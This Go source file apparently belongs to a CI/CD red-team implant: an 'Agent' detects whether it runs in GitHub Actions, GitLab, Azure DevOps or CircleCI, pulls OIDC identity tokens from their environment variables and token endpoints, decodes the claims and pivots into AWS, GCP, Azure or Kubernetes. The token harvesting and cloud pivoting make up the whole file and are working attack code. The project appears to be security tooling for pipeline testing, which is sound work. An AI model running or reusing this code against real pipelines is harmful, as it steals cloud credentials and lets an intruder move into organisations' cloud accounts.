// Copyright (C) 2026 boostsecurity.io
// SPDX-License-Identifier: AGPL-3.0-or-later

package brisket

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"

	"github.com/boostsecurityio/smokedmeat/internal/models"
)

type OIDCToken struct {
	RawToken string `json:"raw_token,omitempty"`

	Platform    models.CIPlatform `json:"platform"`
	TokenSource string            `json:"token_source"`

	Issuer    string `json:"iss,omitempty"`
	Subject   string `json:"sub,omitempty"`
	Audience  string `json:"aud,omitempty"`
	ExpiresAt int64  `json:"exp,omitempty"`
	IssuedAt  int64  `json:"iat,omitempty"`

	Repository      string `json:"repository,omitempty"`
	RepositoryOwner string `json:"repository_owner,omitempty"`
	Workflow        string `json:"workflow,omitempty"`
	Actor           string `json:"actor,omitempty"`
	Ref             string `json:"ref,omitempty"`
	RefType         string `json:"ref_type,omitempty"`
	RunID           string `json:"run_id,omitempty"`
	Environment     string `json:"environment,omitempty"`
	JobWorkflowRef  string `json:"job_workflow_ref,omitempty"`

	DetectedProvider string   `json:"detected_provider,omitempty"`
	TargetAudiences  []string `json:"target_audiences,omitempty"`

	AllClaims map[string]interface{} `json:"all_claims,omitempty"`
}

func getArgOrEnv(args []string, argName string, envNames ...string) string {
	prefix := "--" + argName + "="
	for _, a := range args {
		if strings.HasPrefix(a, prefix) {
			return strings.TrimPrefix(a, prefix)
		}
	}
	for _, env := range envNames {
		if v := os.Getenv(env); v != "" {
			return v
		}
	}
	return ""
}

func audienceForProvider(provider string, args []string) string {
	switch strings.ToLower(provider) {
	case "aws":
		return "sts.amazonaws.com"
	case "gcp", "google":
		wp := getArgOrEnv(args, "workload-identity-provider", "GCP_WORKLOAD_IDENTITY_PROVIDER")
		if wp != "" {
			return "//iam.googleapis.com/" + wp
		}
		return "https://iam.googleapis.com"
	case "azure", "az":
		return "api://AzureADTokenExchange"
	case "k8s", "kubernetes":
		return "kubernetes"
	default:
		return "sts.amazonaws.com"
	}
}

func (a *Agent) OIDC(audience string) (*OIDCToken, error) {
	platform := detectPlatform()

	var token *OIDCToken
	var err error

	switch platform {
	case models.PlatformGitHubActions:
		token, err = a.extractGitHubOIDC(audience)
	case models.PlatformGitLabCI:
		token, err = a.extractGitLabOIDC()
	case models.PlatformAzureDevOps:
		token, err = a.extractAzureDevOpsOIDC()
	case models.PlatformCircleCI:
		token, err = a.extractCircleCIOIDC()
	default:
		return nil, fmt.Errorf("OIDC not supported on platform: %s", platform)
	}

	if err != nil {
		return nil, err
	}

	token.DetectedProvider = detectCloudProvider(token)
	token.TargetAudiences = detectTargetAudiences(token)

	return token, nil
}

func (a *Agent) OIDCPivot(provider string, args []string) (*models.PivotResult, error) {
	start := time.Now()
	result := &models.PivotResult{
		Provider: provider,
		Method:   "oidc",
		Errors:   []string{},
	}

	audience := audienceForProvider(provider, args)
	token, err := a.OIDC(audience)
	if err != nil {
		result.Errors = append(result.Errors, fmt.Sprintf("Failed to extract OIDC token: %v", err))
		result.Duration = float64(time.Since(start).Milliseconds())
		return result, err
	}

	a.lastOIDC = token

	switch strings.ToLower(provider) {
	case "aws":
		err = a.pivotAWS(token, result, args)
	case "gcp", "google":
		err = a.pivotGCP(token, result, args)
	case "azure", "az":
		err = a.pivotAzure(token, result, args)
	case "k8s", "kubernetes":
		err = a.pivotKubernetes(token, result)
	case "auto":
		if token.DetectedProvider != "" && token.DetectedProvider != "generic" {
			return a.OIDCPivot(token.DetectedProvider, args)
		}
		result.Errors = append(result.Errors, "Could not auto-detect cloud provider from OIDC claims")
		err = fmt.Errorf("auto-detection failed")
	default:
		err = fmt.Errorf("unknown provider: %s (use: aws, gcp, azure, k8s, auto)", provider)
	}

	if err != nil {
		result.Errors = append(result.Errors, err.Error())
	} else {
		result.Success = true
	}

	result.Duration = float64(time.Since(start).Milliseconds())
	return result, err
}

func (a *Agent) extractGitHubOIDC(audience string) (*OIDCToken, error) {
	requestURL := os.Getenv("ACTIONS_ID_TOKEN_REQUEST_URL")
	requestToken := os.Getenv("ACTIONS_ID_TOKEN_REQUEST_TOKEN")

	if requestURL == "" || requestToken == "" {
		return nil, fmt.Errorf("OIDC not available: ACTIONS_ID_TOKEN_REQUEST_URL or ACTIONS_ID_TOKEN_REQUEST_TOKEN not set")
	}

	if audience == "" {
		audience = "sts.amazonaws.com"
	}

	req, err := http.NewRequest("GET", requestURL+"&audience="+url.QueryEscape(audience), http.NoBody)
	if err != nil {
		return nil, fmt.Errorf("failed to create token request: %w", err)
	}
	req.Header.Set("Authorization", "Bearer "+requestToken)

	resp, err := a.client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("failed to fetch OIDC token: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		body := readResponseBody(resp.Body, 4096)
		return nil, fmt.Errorf("OIDC token request failed (%d): %s", resp.StatusCode, body)
	}

	var tokenResp struct {
		Value string `json:"value"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&tokenResp); err != nil {
		return nil, fmt.Errorf("failed to decode token response: %w", err)
	}

	token := &OIDCToken{
		RawToken:    tokenResp.Value,
		Platform:    models.PlatformGitHubActions,
		TokenSource: "ACTIONS_ID_TOKEN_REQUEST_URL",
	}

	if err := decodeJWTClaims(token); err != nil {
		return nil, fmt.Errorf("failed to decode JWT claims: %w", err)
	}

	return token, nil
}

func (a *Agent) extractGitLabOIDC() (*OIDCToken, error) {
	rawToken := os.Getenv("CI_JOB_JWT_V2")
	if rawToken == "" {
		rawToken = os.Getenv("CI_JOB_JWT")
	}
	if rawToken == "" {
		return nil, fmt.Errorf("OIDC not available: CI_JOB_JWT or CI_JOB_JWT_V2 not set")
	}

	token := &OIDCToken{
		RawToken:    rawToken,
		Platform:    models.PlatformGitLabCI,
		TokenSource: "CI_JOB_JWT_V2",
	}

	if err := decodeJWTClaims(token); err != nil {
		return nil, fmt.Errorf("failed to decode JWT claims: %w", err)
	}

	return token, nil
}

func (a *Agent) extractAzureDevOpsOIDC() (*OIDCToken, error) {
	requestURI := os.Getenv("SYSTEM_OIDCREQUESTURI")
	if requestURI == "" {
		return nil, fmt.Errorf("OIDC not available: SYSTEM_OIDCREQUESTURI not set")
	}

	systemAccessToken := os.Getenv("SYSTEM_ACCESSTOKEN")
	if systemAccessToken == "" {
		return nil, fmt.Errorf("OIDC not available: SYSTEM_ACCESSTOKEN not set")
	}

	serviceConnectionID := os.Getenv("SYSTEM_SERVICECONNECTIONID")
	if serviceConnectionID == "" {
		return nil, fmt.Errorf("OIDC not available: SYSTEM_SERVICECONNECTIONID not set (configure service connection)")
	}

	reqURL := fmt.Sprintf("%s?api-version=7.1&serviceConnectionId=%s", requestURI, serviceConnectionID)
	req, err := http.NewRequest("POST", reqURL, http.NoBody)
	if err != nil {
		return nil, fmt.Errorf("failed to create token request: %w", err)
	}
	req.Header.Set("Authorization", "Bearer "+systemAccessToken)
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("failed to fetch OIDC token: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		body := readResponseBody(resp.Body, 4096)
		return nil, fmt.Errorf("OIDC token request failed (%d): %s", resp.StatusCode, body)
	}

	var tokenResp struct {
		OIDCToken string `json:"oidcToken"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&tokenResp); err != nil {
		return nil, fmt.Errorf("failed to decode token response: %w", err)
	}

	token := &OIDCToken{
		RawToken:    tokenResp.OIDCToken,
		Platform:    models.PlatformAzureDevOps,
		TokenSource: "SYSTEM_OIDCREQUESTURI",
	}

	if err := decodeJWTClaims(token); err != nil {
		return nil, fmt.Errorf("failed to decode JWT claims: %w", err)
	}

	return token, nil
}

func (a *Agent) extractCircleCIOIDC() (*OIDCToken, error) {
	rawToken := os.Getenv("CIRCLE_OIDC_TOKEN")
	if rawToken == "" {
		rawToken = os.Getenv("CIRCLE_OIDC_TOKEN_V2")
	}
	if rawToken == "" {
		return nil, fmt.Errorf("OIDC not available: CIRCLE_OIDC_TOKEN not set")
	}

	token := &OIDCToken{
		RawToken:    rawToken,
		Platform:    models.PlatformCircleCI,
		TokenSource: "CIRCLE_OIDC_TOKEN",
	}

	if err := decodeJWTClaims(token); err != nil {
		return nil, fmt.Errorf("failed to decode JWT claims: %w", err)
	}

	return token, nil
}

func decodeJWTClaims(token *OIDCToken) error {
	parts := strings.Split(token.RawToken, ".")
	if len(parts) != 3 {
		return fmt.Errorf("invalid JWT format: expected 3 parts, got %d", len(parts))
	}

	payload, err := base64.RawURLEncoding.DecodeString(parts[1])
	if err != nil {
		payload, err = base64.StdEncoding.DecodeString(parts[1])
		if err != nil {
			return fmt.Errorf("failed to decode JWT payload: %w", err)
		}
	}

	var claims map[string]interface{}
	if err := json.Unmarshal(payload, &claims); err != nil {
		return fmt.Errorf("failed to parse JWT claims: %w", err)
	}

	token.AllClaims = claims

	if iss, ok := claims["iss"].(string); ok {
		token.Issuer = iss
	}
	if sub, ok := claims["sub"].(string); ok {
		token.Subject = sub
	}
	if aud, ok := claims["aud"].(string); ok {
		token.Audience = aud
	}
	if exp, ok := claims["exp"].(float64); ok {
		token.ExpiresAt = int64(exp)
	}
	if iat, ok := claims["iat"].(float64); ok {
		token.IssuedAt = int64(iat)
	}

	if repo, ok := claims["repository"].(string); ok {
		token.Repository = repo
	}
	if owner, ok := claims["repository_owner"].(string); ok {
		token.RepositoryOwner = owner
	}
	if workflow, ok := claims["workflow"].(string); ok {
		token.Workflow = workflow
	}
	if actor, ok := claims["actor"].(string); ok {
		token.Actor = actor
	}
	if ref, ok := claims["ref"].(string); ok {
		token.Ref = ref
	}
	if refType, ok := claims["ref_type"].(string); ok {
		token.RefType = refType
	}
	if runID, ok := claims["run_id"].(string); ok {
		token.RunID = runID
	}
	if env, ok := claims["environment"].(string); ok {
		token.Environment = env
	}
	if jobRef, ok := claims["job_workflow_ref"].(string); ok {
		token.JobWorkflowRef = jobRef
	}

	return nil
}

func detectCloudProvider(token *OIDCToken) string {
	aud := strings.ToLower(token.Audience)

	if strings.Contains(aud, "amazonaws.com") || strings.Contains(aud, "sts.amazonaws") {
		return "aws"
	}
	if strings.Contains(aud, "google") || strings.Contains(aud, "gcp") {
		return "gcp"
	}
	if strings.Contains(aud, "azure") || strings.Contains(aud, "microsoft") {
		return "azure"
	}
	if strings.Contains(aud, "kubernetes") || strings.Contains(aud, "k8s") {
		return "k8s"
	}

	iss := strings.ToLower(token.Issuer)
	if strings.Contains(iss, "gitlab") {
		return "generic"
	}

	return "generic"
}

func detectTargetAudiences(token *OIDCToken) []string {
	var targets []string

	cloudAudiences := map[string]string{
		"sts.amazonaws.com":          "aws",
		"https://iam.googleapis.com": "gcp",
		"api://AzureADTokenExchange": "azure",
		"https://kubernetes.default": "k8s",
		"sigstore":                   "sigstore",
	}

	aud := token.Audience
	for pattern, provider := range cloudAudiences {
		if strings.Contains(aud, pattern) {
			targets = append(targets, provider)
		}
	}

	return targets
}
